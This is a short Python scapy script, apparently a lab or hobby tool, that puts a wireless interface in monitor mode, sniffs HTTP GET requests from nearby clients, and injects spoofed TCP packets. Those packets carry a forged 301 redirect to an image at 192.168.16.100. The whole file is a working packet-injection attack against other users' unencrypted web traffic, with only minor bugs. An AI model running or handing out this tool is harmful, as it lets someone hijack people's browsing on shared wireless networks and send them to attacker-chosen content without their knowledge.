#!/usr/bin/env python3

import subprocess
from scapy.all import *
import argparse

# Set interface into monitor mode. Probably do not need if you tell them to specify the monitor mode interface
def set_monitor_mode(interface):
	try:

		subprocess.run(['iw', 'dev', interface, 'add', 'mon0', 'type', 'monitor' ])
		subprocess.run(['ip', 'link', 'mon0', 'up'])
	except:
		print("Error setting interafce into monitor mode")

# Sniff packets for HTTP
def packet_handler(packet):

	http_response = (
		b"HTTP/1.1 301 Moved Permanently\r\n"
		b"Location: http://192.168.16.100/alex.jpg\r\n"
		b"Content-Length: 0\r\n"
		b"\r\n"
		)
	if packet.haslayer(TCP):
		global evil_payload
		if packet[TCP].dport == 80:
			
			#802.11 Stuff
			get_request = bytes(packet[TCP].payload)
			if b"GET" in get_request:
				new_dst_mac = packet[Dot11].addr2
				new_src_mac = packet[Dot11].addr1
				wifi_frame = Dot11(type=2, subtype=0, FCfield="from-DS", addr1=new_dst_mac, addr2=new_src_mac, addr3=new_src_mac)

			#TCP Stuff
				new_dst_ip = packet[IP].src
				new_src_ip = packet[IP].dst
				client_port = packet[TCP].sport
				seq_num = packet[TCP].ack
				payload_len = len(packet[TCP].payload)
				ack_num = packet[TCP].seq + payload_len
				print(f"I see http traffic coming from {new_dst_ip}")
			#Payload
				evil_payload = RadioTap() / wifi_frame / LLC() / SNAP() / IP(dst=new_dst_ip, src=new_src_ip) / TCP(sport=80, dport=client_port, flags="PA", seq=seq_num, ack=ack_num) / raw(http_response)
				sendp(evil_payload, iface="wlan1mon")
			




parser = argparse.ArgumentParser(description="Inject a redirect Response to a target over wireless")

#Specify Interface
parser.add_argument("-i", "--interface", required=True, help="Interface used to monitor and inject")

#Specify Channel
parser.add_argument("-c", "--channel", required=True, help="The channel of the target")
args = parser.parse_args()

subprocess.run(['iw', 'dev', args.interface, 'set', 'channel', args.channel])
sniff(iface=args.interface, prn=packet_handler, store=0)
